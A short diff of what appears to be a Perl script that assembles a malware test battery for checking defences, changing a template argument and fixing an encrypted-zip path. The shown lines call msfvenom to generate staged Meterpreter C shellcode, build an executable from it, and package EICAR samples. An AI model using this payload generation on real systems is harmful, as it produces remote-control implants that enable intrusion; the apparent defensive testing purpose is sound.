@@ -263,7 +263,7 @@ TCPNOENC64
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c";
   print "\n\n*** 32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
-  &createShellcodeEXEFromTemplate(333,"$targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c");
+  &createShellcodeEXEFromTemplate(510,"$targetFolder/105-${PROJECT}-${PROJECTNUM}-StagedCShellCode-32.c");
 
 
   ###################
@@ -587,7 +587,7 @@ MACSHELL1
   `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
   `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
   `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip /opt/malwaredefense/current/*`;
-  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip -e `;
+  `zip -j -r /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip /opt/malwaredefense/current/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e `;
 
 
 
